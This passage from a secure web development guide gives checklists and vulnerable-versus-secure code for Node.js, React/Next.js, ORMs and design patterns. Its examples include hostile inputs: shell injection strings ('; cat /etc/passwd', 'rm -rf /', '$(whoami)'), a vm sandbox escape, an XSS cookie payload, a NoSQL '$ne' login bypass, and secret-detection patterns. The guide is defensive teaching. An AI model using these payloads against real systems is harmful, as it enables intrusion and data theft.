- Verify SAST tool runs on every PR in CI
- Verify DAST scan runs at least weekly against staging
- Confirm threat model exists and covers all trust boundaries
- Check that security unit tests exist for auth, access control, and input validation
- Verify CI/CD pipeline includes dependency audit, secret scanning, and container scanning
- Confirm CVSS-based SLAs are defined and tracked for vulnerability remediation

---

── Page 23 ──

# Chapter 22: Secure Development Checklist

Use this checklist before deploying any web application feature.

## Authentication
- [ ] All authentication occurs over HTTPS
- [ ] Passwords hashed with bcrypt/scrypt/Argon2id
- [ ] Login returns identical responses for all failure types
- [ ] Rate limiting on login (per-user and per-IP)
- [ ] Account lockout after repeated failures
- [ ] Session regenerated on login
- [ ] MFA available for sensitive accounts
- [ ] Password reset tokens are random, single-use, time-limited

## Session Management
- [ ] Session tokens have 128+ bits of cryptographic randomness
- [ ] Cookies set: Secure, HttpOnly, SameSite=Strict (or Lax)
- [ ] Sessions invalidated server-side on logout
- [ ] Idle and absolute timeouts configured
- [ ] Session tokens never in URLs

## Access Control
- [ ] Deny by default — explicit grants only
- [ ] Authorization checked on every request (not just UI)
- [ ] IDOR protection — ownership verified for every object access
- [ ] Admin functions protected by role checks
- [ ] Centralized authorization logic

## Input Validation
- [ ] Parameterized queries for all database access
- [ ] Output encoding for the correct rendering context
- [ ] No eval(), exec(), system() with user input
- [ ] URL validation for SSRF prevention
- [ ] File upload: extension + magic byte validation
- [ ] Schema validation on all API inputs (Zod, Joi, etc.)

## Security Headers
- [ ] HSTS with adequate max-age
- [ ] CSP with nonces, strict-dynamic, no unsafe-inline
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY (or CSP frame-ancestors)
- [ ] Referrer-Policy configured
- [ ] Permissions-Policy disabling unused features

## Transport and Cryptography
- [ ] TLS 1.2+ enforced, TLS 1.3 preferred
- [ ] No weak ciphers (RC4, DES, 3DES)
- [ ] HTTP redirects to HTTPS
- [ ] No mixed content
- [ ] No secrets in source code or version control

## Error Handling
- [ ] No stack traces, database errors, or paths in responses
- [ ] Production debug mode disabled
- [ ] Detailed errors logged server-side only
- [ ] Generic error messages returned to clients

## Supply Chain
- [ ] Lockfiles committed and used in CI (`npm ci`)
- [ ] Dependencies regularly audited (`npm audit`)
- [ ] Scoped packages for internal dependencies
- [ ] Lockfile changes reviewed in PRs
- [ ] No vulnerable dependencies in production

## Business Logic
- [ ] Server-side calculation of all prices, totals, discounts
- [ ] Workflow state enforced server-side
- [ ] Rate limiting on sensitive business operations
- [ ] Atomic operations for check-and-modify patterns
- [ ] Idempotency keys for non-repeatable operations


: Security Checklist

### Security Logging & Monitoring

- [ ] All authentication events logged (login success, login failure, logout, password reset, MFA events)
- [ ] All admin/privileged actions logged to append-only audit trail with actor, target, old value, new value
- [ ] No passwords, tokens, API keys, or secrets appear in log output (verified by searching for patterns like `password`, `Bearer`, `sk_`, `ck_`)
- [ ] PII masked/redacted in logs (emails partially masked, IPs anonymized before write)
- [ ] Logs use structured JSON format with consistent field names across the application
- [ ] Logs sent to centralized, append-only storage (not just local files that can be deleted)
- [ ] Alerting configured for brute-force detection (10+ failed logins from same IP in 15 minutes)
- [ ] Alerting configured for privilege escalation attempts (non-admin repeatedly hitting admin routes)
- [ ] Alerting configured for unusual admin activity (50+ admin actions per hour)
- [ ] Log retention policies defined per event category and automated cleanup running daily
- [ ] Audit log entries cannot be modified or deleted through any API endpoint (append-only enforcement)

### Credential Lifecycle

- [ ] API keys and tokens have TTL/expiration set at creation time (90 days for API keys, 1h for reset tokens)
- [ ] Maximum active credentials per user enforced (max 5 API keys)
- [ ] Credential revocation is immediate with no caching delay (cache invalidated on revoke)
- [ ] Users notified via email on credential creation, rotation, and revocation
- [ ] Automated cleanup job runs daily to revoke expired and unused (180 days) credentials
- [ ] Key rotation endpoint supports grace periods (both old and new keys valid during 24h rollover)
- [ ] Full API key values never logged — only prefix (first 7 characters)
- [ ] Expired key usage attempts are logged as security events (`API_KEY_EXPIRED_USAGE`)

### Privacy & Data Protection

- [ ] IP addresses anonymized before long-term storage (last octet zeroed for IPv4, first 3 groups only for IPv6)
- [ ] Data retention policy defined for every data category and automated cleanup enforced via daily cron
- [ ] Right-to-deletion implemented with cascade delete across all user-linked tables
- [ ] Audit logs anonymized (actorId set to `DELETED_USER`, metadata cleared) on account deletion, not deleted
- [ ] PII inventory documented and matches actual database schema and third-party integrations
- [ ] Analytics tracking is opt-in with clear user controls (toggle endpoint)
- [ ] Do Not Track header (`DNT: 1`) respected — no analytics tracked when set
- [ ] Error reporting tools (Sentry, etc.) have PII scrubbing configured
- [ ] No unnecessary PII fields in database schema (only collect what the product requires)
- [ ] Account deletion cascades to external services (Clerk, analytics, etc.)

### Middleware & Route Security

- [ ] Default-deny route configuration — all routes require auth unless explicitly listed in a central PUBLIC_ROUTES set
- [ ] No wildcard patterns (`(.*)`, `*`, `:path*`, `startsWith`) in public route lists
- [ ] Public routes listed explicitly in a single, auditable Set or Array — not scattered across middleware
- [ ] Route handler verifies authentication independently (defense-in-depth), not just relying on middleware
- [ ] Multiple auth mechanisms (sessions, API keys, webhooks) documented in auth strategy matrix with per-route assignments
- [ ] Required environment variables validated at application startup — app crashes immediately if any are missing
- [ ] New route additions are automatically protected by default (no middleware changes needed for new protected routes)
- [ ] Route audit script runs in CI pipeline on every deploy to catch accidentally public routes
- [ ] Webhook routes use signature verification (not session auth) and validate on raw request body

### Server-Generated Code

- [ ] No user input interpolated into shell scripts, Dockerfiles, SQL DDL, CI/CD configs, or cron expressions without strict allowlist validation
- [ ] All executable output generation uses parameterized templates or validated allowlists, not string concatenation
- [ ] Shell commands use argument arrays (`execFile`, `spawn`) instead of `exec()` with string interpolation
- [ ] Generated scripts include integrity signatures (HMAC) for tamper detection before execution
- [ ] Context-specific escaping used for each output type (shell-quote for shell, YAML library for YAML, JSON.stringify for JSON)
- [ ] Injection payloads tested against all endpoints that generate executable output (`"; rm -rf /`, `` `$(whoami)` ``, `\nRUN malicious`)
- [ ] No `eval()` calls with any user-influenced input anywhere in the codebase


---

## Server-Side JavaScript
- [ ] No `exec()` calls with user input — use `execFile()` or `spawn()`
- [ ] No `new Buffer(n)` or `Buffer.allocUnsafe()` — use `Buffer.alloc()`
- [ ] No dynamic `require()` with user-controlled paths
- [ ] Body parser limits explicitly set
- [ ] `trust proxy` configured with specific IPs, never `true`

## Modern Framework Security
- [ ] No unsanitized input in `dangerouslySetInnerHTML`
- [ ] URL schemes validated in href/src attributes
- [ ] Every Server Action includes auth and authorization
- [ ] No secrets in `NEXT_PUBLIC_` / `VITE_` / `REACT_APP_` variables
- [ ] Source maps not deployed to production

## ORM and Database Layer
- [ ] No string interpolation in raw ORM queries
- [ ] No `req.body` spread into ORM create/update
- [ ] Input types validated to prevent operator injection
- [ ] Connection strings in environment variables, not source code

## Payment and Financial Security
- [ ] Server-side price lookup for all payments — no client-sent prices
- [ ] Webhook signatures verified with timing-safe comparison
- [ ] Double-spend prevention via unique database constraints
- [ ] Subscription status checked from database, not JWT claims

── Page 24 ──

# Chapter 23: Secure Design Patterns

**Threat Summary:** Most security vulnerabilities originate from design-level decisions, not implementation bugs. Secure-by-design patterns make entire vulnerability classes structurally impossible by leveraging the type system and domain modeling to enforce invariants at compile time rather than relying on runtime validation scattered across the codebase.

**Severity:** HIGH — design-level defenses prevent vulnerability classes rather than individual instances.

## Core Rules

**Rule 1: Use domain primitives instead of raw types.**
A domain primitive is a value object that enforces all business invariants at creation time. Once created, it is guaranteed valid — no further validation needed anywhere in the codebase.

```typescript
// VULNERABLE — raw types allow invalid states throughout the codebase
function createOrder(quantity: number, email: string, price: number) {
  // Must remember to validate everywhere this is called
  if (quantity < 1 || quantity > 240) throw new Error("Invalid quantity");
  if (!email.includes("@")) throw new Error("Invalid email");
  if (price < 0) throw new Error("Invalid price");
  // ...
}

// SECURE — domain primitives enforce invariants at creation
class Quantity {
  readonly value: number;
  constructor(value: number) {
    if (!Number.isInteger(value) || value < 1 || value > 240) {
      throw new Error("Quantity must be integer between 1 and 240");
    }
    this.value = value;
    Object.freeze(this);
  }
}

class EmailAddress {
  readonly value: string;
  constructor(value: string) {
    const trimmed = value.trim().toLowerCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmed)) {
      throw new Error("Invalid email address");
    }
    if (trimmed.length > 254) {
      throw new Error("Email too long");
    }
    this.value = trimmed;
    Object.freeze(this);
  }
}

class MoneyAmount {
  readonly cents: number;
  constructor(cents: number) {
    if (!Number.isInteger(cents) || cents < 0) {
      throw new Error("Money amount must be non-negative integer (cents)");
    }
    this.cents = cents;
    Object.freeze(this);
  }
}

// Now the function signature itself guarantees valid inputs
function createOrder(quantity: Quantity, email: EmailAddress, price: MoneyAmount) {
  // No validation needed here — types guarantee validity
}
```

**Security benefit:** Injection attacks, negative value exploits, and boundary violations become impossible if the type system prevents invalid values from existing in the first place.

**Rule 2: Make illegal states unrepresentable.**
Design your data structures so that the type system prevents invalid combinations. If a state should not exist, make it impossible to construct.

```typescript
// VULNERABLE — boolean flags create impossible/contradictory states
interface Order {
  status: string; // "pending" | "paid" | "shipped" | "cancelled"
  isPaid: boolean;
  isShipped: boolean;
  isCancelled: boolean;
  shippingAddress?: string;
  trackingNumber?: string;
  refundAmount?: number;
}
// Can have: isPaid=true, isCancelled=true, isShipped=true — contradictory!
// Can have: isShipped=true but no shippingAddress — invalid!

// SECURE — discriminated union makes illegal states unrepresentable
type Order =
  | { status: "pending"; items: OrderItem[] }
  | { status: "paid"; items: OrderItem[]; paymentId: string }
  | {
      status: "shipped";
      items: OrderItem[];
      paymentId: string;
      shippingAddress: string;  // Required when shipped
      trackingNumber: string;   // Required when shipped
    }
  | {
      status: "cancelled";
      items: OrderItem[];
      cancelReason: string;
      refundAmount: MoneyAmount; // Required when cancelled
    };

// TypeScript enforces: shipped orders MUST have address and tracking
// Cancelled orders MUST have refund amount
// No contradictory state combinations are possible
```

**Security benefit:** This eliminates business logic vulnerabilities where code paths assume certain data exists based on status but the data was never set, or where contradictory states lead to unexpected behavior (e.g., a cancelled-but-shipped order that bypasses refund logic).

**Rule 3: Use explicit state machines for entity lifecycle management.**
Complex entities transition through states. Implicit state management (setting boolean flags) leads to invalid transitions and bypass vulnerabilities.

```typescript
// Define allowed transitions explicitly
const ORDER_TRANSITIONS: Record<string, string[]> = {
  pending:   ["paid", "cancelled"],
  paid:      ["shipped", "refunded"],
  shipped:   ["delivered", "returned"],
  delivered: ["returned"],
  cancelled: [],  // Terminal state
  refunded:  [],  // Terminal state
  returned:  ["refunded"],
};

class OrderStateMachine {
  constructor(private currentState: string) {}

  transition(newState: string): void {
    const allowed = ORDER_TRANSITIONS[this.currentState];
    if (!allowed || !allowed.includes(newState)) {
      throw new Error(
        `Invalid transition: ${this.currentState} → ${newState}. ` +
        `Allowed: ${allowed?.join(", ") || "none (terminal state)"}`
      );
    }
    this.currentState = newState;
  }
}

// Prevents: skipping payment, shipping cancelled orders,
// double-refunding, or reaching states via invalid paths
```

**Security benefit:** Workflow bypass attacks (Chapter 14) become impossible because the state machine rejects invalid transitions. An attacker cannot skip from "pending" to "shipped" or move a "cancelled" order to "delivered."

**Rule 4: Apply a structured validation hierarchy.**
Input validation should follow five levels, applied in order. Each level gates the next — fail fast at the cheapest check.

| Level | Name | What It Checks | Example |
|-------|------|----------------|---------|
| 1 | Origin | Where did the data come from? | Reject requests from unexpected origins |
| 2 | Size | Is the data within size bounds? | Reject payloads > 1MB before parsing |
| 3 | Lexical | Does it contain only allowed characters? | Email: alphanumeric + `@._-` only |
| 4 | Syntax | Does it match the expected format? | Email: matches `/^[^@]+@[^@]+\.[^@]+$/` |
| 5 | Semantic | Is it valid in the business context? | Email: domain has MX record; user exists |

```typescript
// Structured validation — each level gates the next
function validateUserInput(input: unknown): ValidatedUser {
  // Level 1: Origin — handled by middleware (CORS, auth)

  // Level 2: Size — reject before expensive parsing
  const raw = input as Record<string, unknown>;
  if (JSON.stringify(raw).length > 10_000) {
    throw new ValidationError("Payload too large", "size");
  }

  // Level 3: Lexical — only allowed characters
  const name = String(raw.name ?? "");
  if (!/^[\p{L}\p{N}\s.\-']+$/u.test(name)) {
    throw new ValidationError("Name contains invalid characters", "lexical");
  }

  // Level 4: Syntax — correct format
  const email = String(raw.email ?? "");
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    throw new ValidationError("Invalid email format", "syntax");
  }

  // Level 5: Semantic — business rules
  // (e.g., check domain has MX record, user limit not exceeded)

  return new ValidatedUser(name, new EmailAddress(email));
}
```

**Security benefit:** Layered validation prevents bypass via encoding tricks (caught at lexical level), malformed input (caught at syntax level), and business logic abuse (caught at semantic level). Processing is efficient because cheap checks run first.

## Quick Reference: Design Pattern Selection

| Problem | Pattern | What It Prevents |
|---------|---------|------------------|
| Raw strings/numbers carry no validation guarantee | Domain primitives | Injection, boundary violations |
| Boolean flags create contradictory states | Discriminated unions | Business logic bypasses |
| Entity lifecycle has no enforced ordering | State machine | Workflow bypass, invalid transitions |
| Validation is scattered and inconsistent | Validation hierarchy | Bypass via encoding, format tricks |
| Functions accept too-broad types | Narrow input types | Mass assignment, type confusion |
| Error states are ambiguous | Result types (Ok/Err) | Silent failures, error swallowing |

## Verification

- Review domain models for raw primitive types (string, number) that represent constrained business values — each should be a domain primitive
- Check for boolean flag combinations that can create contradictory states
- Verify that entity state transitions are explicitly defined and enforced
- Confirm input validation follows the 5-level hierarchy (origin, size, lexical, syntax, semantic)
- Test that domain primitives reject invalid values at construction time
- Verify that type-level constraints prevent illegal states from being representable

---

── Page 25 ──

# Chapter 24: Server-Side JavaScript Security

**Threat Summary:** Node.js introduces runtime-specific attack vectors: shell injection via child processes, sandbox escapes via the vm module, uninitialized memory leaks via Buffers, and event loop blocking that creates single-request DoS. These are unique to the Node.js execution model.

**Severity:** CRITICAL

## Core Rules

**Rule 1: Never use exec() with user input -- use execFile() or spawn() with argument arrays.**

exec() spawns a shell that interprets metacharacters (;, |, `, $()). execFile and spawn bypass the shell entirely, treating each argument as a literal string.

Vulnerable:

```javascript
// VULNERABLE -- shell interprets semicolons and pipes
const { exec } = require('child_process');
exec(`nslookup ${req.query.domain}`);
// Attacker sends: domain=example.com; cat /etc/passwd
// Shell sees two commands: nslookup example.com AND cat /etc/passwd
```

Secure:

```javascript
// SECURE -- no shell invoked, arguments passed as array elements
const { execFile } = require('child_process');
execFile('nslookup', [req.query.domain], (err, stdout) => {
  // "example.com; cat /etc/passwd" becomes a single argument to nslookup
  // nslookup fails gracefully -- no shell metacharacter interpretation
});
```

**Rule 2: The vm module is NOT a security boundary.**

The vm module shares the same V8 heap and Node.js runtime as the host process. Every published sandbox built on vm (including vm2, which has CVSS 9.8 escapes) has been broken. Use isolated-vm for V8-level isolation or OS-level containers for untrusted code execution.

Vulnerable:

```javascript
// VULNERABLE -- trivial sandbox escape via constructor chain
const vm = require('vm');
const sandbox = vm.createContext({});
vm.runInContext(`
  const ForeignFunction = this.constructor.constructor;
  const process = ForeignFunction('return process')();
  process.mainModule.require('child_process').execSync('id').toString();
`, sandbox);
// Attacker has full access to the host process
```

Secure:

```javascript
// SECURE -- V8 isolates with true memory separation
const ivm = require('isolated-vm');
const isolate = new ivm.Isolate({ memoryLimit: 128 });
const context = isolate.createContextSync();
// Code runs in a separate V8 isolate -- no access to host objects
const result = context.evalSync('"hello " + "world"');
// Cannot access process, require, or any Node.js APIs
```

**Rule 3: Always use Buffer.alloc(), never new Buffer(n) or Buffer.allocUnsafe().**

When Buffer is allocated without zeroing, the returned memory contains whatever was previously stored at that address: passwords, cryptographic keys, session tokens, or other process data. Buffer.alloc() zero-fills by default. Buffer.from() copies from a known source.

```javascript
// VULNERABLE -- uninitialized memory may contain secrets
const buf = new Buffer(1024);
const buf2 = Buffer.allocUnsafe(1024);

// SECURE -- memory is zero-filled
const buf = Buffer.alloc(1024);
const buf2 = Buffer.from('known input', 'utf8');
```

**Rule 4: Never allow user input to influence require() paths.**

Dynamic require() with user-controlled strings enables path traversal and loading of arbitrary built-in modules (child_process, fs, net). Use an explicit allowlist map that maps user-facing names to pre-approved modules.

```javascript
// VULNERABLE -- attacker loads child_process
const mod = require(req.query.module);

// SECURE -- allowlist map
const ALLOWED = { markdown: require('marked'), csv: require('csv-parse') };
const mod = ALLOWED[req.query.format];
if (!mod) return res.status(400).send('Unsupported format');
```

**Rule 5: Set explicit body parser limits and validate Content-Type.**

Without limits, a single request with a multi-gigabyte JSON body exhausts memory and crashes the process. Set limits on every parser.

```javascript
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb', parameterLimit: 100 }));
```

**Rule 6: Never set trust proxy to true -- specify exact proxy IPs or hop count.**

`trust proxy: true` trusts every hop in the X-Forwarded-For chain. An attacker can prepend any IP address, defeating rate limiting, geo-restrictions, and IP-based access control. Set a specific hop count or list of trusted proxy IPs.

```javascript
// VULNERABLE -- trusts any X-Forwarded-For value
app.set('trust proxy', true);

// SECURE -- trust exactly one proxy hop (e.g., load balancer)
app.set('trust proxy', 1);
// Or specify trusted proxy IPs
app.set('trust proxy', '10.0.0.0/8');
```

**Rule 7: Register auth middleware BEFORE route handlers.**

Express middleware executes in registration order. Any route registered before auth middleware runs without authentication. This is a silent, hard-to-detect misconfiguration.

```javascript
// VULNERABLE -- /api/admin is unprotected
app.get('/api/admin', adminHandler);
app.use(authMiddleware);

// SECURE -- auth runs first for all subsequent routes
app.use(authMiddleware);
app.get('/api/admin', adminHandler);
```

**Rule 8: Wrap all async route handlers to catch unhandled rejections.**

Unhandled promise rejections crash the process in Node 15+ or silently leave it in a broken state in older versions. Never leak stack traces to clients in error responses.

```javascript
// Async error wrapper -- catches thrown errors and rejected promises
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get('/api/data', asyncHandler(async (req, res) => {
  const data = await fetchData(req.query.id);
  res.json(data);
}));

// Global error handler -- logs internally, returns generic message
app.use((err, req, res, next) => {
  logger.error({ err, reqId: req.id });
  res.status(500).json({ error: 'Internal server error' });
});
```

## Verification

- Grep for `exec(` and `child_process` -- ensure no string concatenation or template literals with user input
- Search for `new Buffer(` -- all instances should be `Buffer.alloc()` or `Buffer.from()`
- Check every `require()` call with a variable argument -- must use an allowlist map
- Verify the `trust proxy` setting matches your actual infrastructure topology
- Confirm every body parser middleware has an explicit `limit` option
- Verify middleware ordering: security headers, auth, then route handlers
- Check for unhandled async routes without error wrapping

---

── Page 26 ──

# Chapter 25: Modern Framework Security

**Threat Summary:** React, Next.js, and SSR frameworks introduce framework-specific attack surfaces: dangerouslySetInnerHTML bypasses React's auto-escaping, Server Actions are public endpoints without built-in auth, props passed to Client Components are visible in the browser, environment variable prefixes leak secrets into bundles, and SSR state serialization creates XSS vectors.

**Severity:** HIGH

## Core Rules

**Rule 1: Never pass unsanitized user input to dangerouslySetInnerHTML.**

React auto-escapes JSX text content (`<div>{userInput}</div>` is safe), but dangerouslySetInnerHTML is functionally equivalent to innerHTML. If you must render HTML, sanitize with DOMPurify using an explicit allowlist of tags and attributes.

Vulnerable:

```jsx
// VULNERABLE -- direct XSS via innerHTML equivalent
function Comment({ userComment }) {
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
  // userComment = '<img src=x onerror=alert(document.cookie)>'
}
```

Secure:

```jsx
// SECURE -- sanitize with strict allowlist before rendering
import DOMPurify from 'dompurify';

function Comment({ userComment }) {
  const clean = DOMPurify.sanitize(userComment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Rule 2: Validate URL schemes in href and src attributes -- allowlist http:, https:, and mailto: only.**

React does NOT validate attribute values. A `javascript:` URI in an href executes arbitrary code when clicked. Data URIs can also carry payloads.

```javascript
// URL sanitizer -- rejects javascript:, data:, vbscript: schemes
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return parsed.href;
    }
  } catch {
    // Malformed URL
  }
  return '#';
}

// Usage: <a href={sanitizeUrl(userProvidedUrl)}>Link</a>
```

**Rule 3: Every Server Action is a public HTTP POST endpoint -- add auth, validation, and authorization.**

The `'use server'` directive compiles a function into a POST endpoint. It provides no access control, no input validation, and no authorization. Treat every Server Action exactly like a REST API handler.

Secure:

```typescript
'use server';
import { auth } from '@/lib/auth';
import { z } from 'zod';

const DeleteUserSchema = z.object({ userId: z.string().uuid() });

export async function deleteUser(rawInput: unknown) {
  // Authentication
  const session = await auth();
  if (!session?.user) throw new Error('Unauthorized');

  // Input validation
  const { userId } = DeleteUserSchema.parse(rawInput);

  // Authorization
  if (session.user.role !== 'admin') throw new Error('Forbidden');

  // Mutation
  await db.user.delete({ where: { id: userId } });
}
```

**Rule 4: Props passed from Server Components to Client Components are public.**

Everything serialized across the server-client boundary appears in the HTML payload or RSC stream. Database records, internal IDs, and sensitive fields are exposed. Create a Data Access Layer that selects only the fields the client needs. Use `import 'server-only'` to prevent server modules from accidentally bundling into client code.

```typescript
// VULNERABLE -- entire user record sent to client
// <UserProfile user={await db.user.findUnique({ where: { id } })} />

// SECURE -- only public fields cross the boundary
const publicUser = await db.user.findUnique({
  where: { id },
  select: { id: true, name: true, avatarUrl: true },
});
// <UserProfile user={publicUser} />
```

**Rule 5: Only use NEXT_PUBLIC_ / VITE_ / REACT_APP_ prefixes for genuinely public values.**

These environment variables are inlined into the JavaScript bundle at build time. They are visible to anyone who opens browser DevTools. Never prefix database URLs, API secret keys, webhook secrets, or internal service tokens.

```bash
// WRONG -- secret key exposed in browser bundle
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_xxx

// CORRECT -- public key is safe for client, secret stays server-only
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_xxx
STRIPE_SECRET_KEY=sk_live_xxx
```

**Rule 6: Never use React.createElement with user-controlled component types or props.**

If user input controls the first argument of `React.createElement()` or is spread as props, attackers can inject `dangerouslySetInnerHTML`. Use an allowlist map for dynamic component rendering.

```jsx
// VULNERABLE -- attacker controls component type
const Component = componentMap[userInput]; // what if userInput = 'div'?
// and props include dangerouslySetInnerHTML?

// SECURE -- strict allowlist with no prop spreading
const ALLOWED_COMPONENTS = { alert: AlertBox, card: InfoCard };
const Component = ALLOWED_COMPONENTS[userInput];
if (!Component) return null;
return <Component title={sanitizedTitle} body={sanitizedBody} />;
```

**Rule 7: Escape serialized state for SSR -- replace script-breaking sequences.**

When SSR embeds JSON state inside `<script>` tags, user data containing `</script>` breaks out of the JSON context and injects HTML. Always escape angle brackets in serialized state.

```javascript
// Escape function for SSR state serialization
function serializeState(state) {
  return JSON.stringify(state)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}

// Usage in SSR template
// <script>window.__STATE__ = ${serializeState(initialState)}</script>
```

**Rule 8: Never deploy source maps to production.**

Source maps reconstruct your entire source tree, including comments, variable names, and business logic. Use `hidden-source-map` in your build config and upload maps only to your error tracking service (Sentry, Datadog) via their CLI.

**Rule 9: Middleware is not a security boundary -- authorize at the data access layer.**

Framework middleware can be bypassed through implementation bugs (e.g., CVE-2025-29927 in Next.js). Defense-in-depth requires checking authorization as close to the data mutation as possible, not just at the routing layer.

**Rule 10: Restrict image optimization domains to an explicit allowlist.**

Next.js's `/_next/image` endpoint proxies and transforms images from external URLs. Wildcard hostname patterns (`**`) enable SSRF, allowing attackers to use your server to fetch internal network resources.

```javascript
// next.config.js
// VULNERABLE -- allows fetching from any host
// images: { remotePatterns: [{ hostname: '**' }] }

// SECURE -- explicit domains only
images: {
  remotePatterns: [
    { protocol: 'https', hostname: 'cdn.example.com' },
    { protocol: 'https', hostname: 'images.unsplash.com' },
  ],
}
```

## Verification

- Grep for `dangerouslySetInnerHTML` -- every instance must have DOMPurify or equivalent sanitization
- Search for `NEXT_PUBLIC_`, `VITE_`, `REACT_APP_` with sensitive keywords (SECRET, KEY, PASSWORD, TOKEN, DATABASE)
- Verify every Server Action has authentication and authorization checks at the top of the function body
- Check `next.config.js` or `next.config.ts` for `images.remotePatterns` wildcard entries
- Scan build output for accidentally included secrets: search `.next/static/` or `dist/` for patterns like `sk_live_`, `AKIA`, `ghp_`
- Confirm source maps are not served from production URLs
- Review all `React.createElement` calls with dynamic type arguments

---

── Page 27 ──

# Chapter 26: ORM and Database Layer Security

**Threat Summary:** ORMs provide convenience but not automatic security. Raw queries with string interpolation, spreading request bodies into create/update calls, and MongoDB operator injection all bypass the ORM's built-in protections. N+1 queries create DoS vectors, and connection strings in source code or logs expose database credentials.

**Severity:** HIGH

## Core Rules

**Rule 1: Never use string interpolation in raw ORM queries -- always use parameterized queries.**

Every ORM provides an escape hatch for raw SQL. Every escape hatch is vulnerable to injection when combined with string interpolation or concatenation. Use the ORM's parameterization mechanism instead.

Vulnerable:

```javascript
// VULNERABLE -- SQL injection in every major ORM

// Prisma -- $queryRawUnsafe with template literal
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`);

// Sequelize -- string query without bind parameters
await sequelize.query(`SELECT * FROM users WHERE name = '${name}'`);

// TypeORM -- string interpolation in where clause
qb.where(`user.name = '${name}'`);
```

Secure:

```javascript
// SECURE -- parameterized queries in every major ORM

// Prisma -- tagged template literal (automatically parameterized)
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;

// Sequelize -- replacements array (positional) or named parameters
await sequelize.query('SELECT * FROM users WHERE name = ?', {
  replacements: [name],
});

// TypeORM -- named parameters with colon syntax
qb.where('user.name = :name', { name });

// Drizzle -- builder methods handle parameterization
await db.select().from(users).where(eq(users.name, name));
```

**Rule 2: Never spread request bodies into ORM create/update -- use explicit field allowlists.**

Spreading `req.body` into a create or update call lets attackers set any column: role escalation, bypassing verification flags, modifying foreign keys, or overwriting audit fields.

Vulnerable:

```javascript
// VULNERABLE -- attacker adds { "role": "admin", "verified": true }
await prisma.user.create({ data: req.body });
await prisma.user.update({ where: { id }, data: req.body });
```

Secure:

```javascript
// SECURE -- validate then destructure only allowed fields
const { name, email } = CreateUserSchema.parse(req.body);
await prisma.user.create({
  data: { name, email, role: 'user', verified: false },
});
```

**Rule 3: Validate input types to prevent NoSQL operator injection.**

MongoDB and Mongoose accept objects as query values. If request body parsing produces `{ "$ne": "" }` instead of a string, the query matches all documents where the field is not empty -- bypassing authentication entirely.

Vulnerable:

```javascript
// VULNERABLE -- NoSQL injection via object in password field
// Attacker sends: { "username": "admin", "password": { "$ne": "" } }
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password,
});
// Query becomes: find where password is not empty -- matches admin
```

Secure:

```javascript
// SECURE -- enforce expected types before querying
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
  return res.status(400).json({ error: 'Invalid input types' });
}

// Or use express-mongo-sanitize middleware to strip $ operators globally
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
```

**Rule 4: Use DataLoader or eager loading to prevent N+1 query DoS.**

A single GraphQL or nested REST query can generate thousands of individual database queries. One malicious query can saturate your database connection pool. Use DataLoader to batch and deduplicate, and set query depth and complexity limits on your GraphQL schema.

```javascript
// VULNERABLE -- N+1: one query per post author
// resolve: (post) => db.user.findUnique({ where: { id: post.authorId } })

// SECURE -- DataLoader batches into a single query
const userLoader = new DataLoader(async (ids) => {
  const users = await db.user.findMany({ where: { id: { in: [...ids] } } });
  const userMap = new Map(users.map(u => [u.id, u]));
  return ids.map(id => userMap.get(id));
});
// resolve: (post) => userLoader.load(post.authorId)
```

**Rule 5: Select only the fields you need to return -- never expose full records.**

```javascript
// SECURE -- explicit field selection prevents leaking internal data
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, name: true, email: true, avatarUrl: true },
  // passwordHash, stripeCustomerId, internalNotes are never returned
});
```

**Rule 6: Never hardcode connection strings -- use environment variables with secret management.**

Connection strings in source code end up in git history forever. Even after removal, they persist in older commits. Use environment variables loaded from a secret manager. Redact connection strings in application logs.

```javascript
// VULNERABLE -- credentials in source code
const pool = new Pool({ connectionString: 'postgres://admin:s3cret@db.internal:5432/app' });

// SECURE -- environment variable, never logged
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
```

**Rule 7: Enforce multi-tenancy at the data access layer, not per-query.**

A single missing `WHERE tenant_id = ?` in one query leaks data across tenants. Instead of relying on every developer remembering the filter, implement automatic tenant scoping in a middleware or ORM extension that applies to all queries.

```javascript
// SECURE -- Prisma extension that automatically adds tenant scoping
function tenantScoped(prisma, tenantId) {
  return prisma.$extends({
    query: {
      $allOperations({ args, query }) {
        if (args.where) {
          args.where.tenantId = tenantId;
        } else {
          args.where = { tenantId };
        }
        return query(args);
      },
    },
  });
}

// Every query through this client is automatically scoped
const scopedDb = tenantScoped(prisma, req.tenantId);
await scopedDb.document.findMany(); // WHERE tenantId = ? is automatic
```

## Verification

- Grep for `$queryRawUnsafe`, `sequelize.query(`, and string interpolation in query builder methods
- Search for `req.body` passed directly to ORM create, update, or upsert calls
- Verify Mongoose queries validate input types -- no objects where strings are expected
- Check GraphQL resolvers for N+1 patterns without DataLoader or equivalent batching
- Confirm DATABASE_URL and other connection strings are not in source code or git history: `git log -p --all -S 'postgres://'`
- Verify multi-tenant queries include automatic tenant scoping at the data access layer

---

── Page 28 ──

# Chapter 27: Payment and Financial Security

**Threat Summary:** Payment systems require server-side price verification, cryptographic webhook signature validation, idempotent processing, and atomic double-spend prevention. Client-side cart data, payment status, and subscription state are all attacker-controlled and must never be trusted.

**Severity:** CRITICAL

## Core Rules

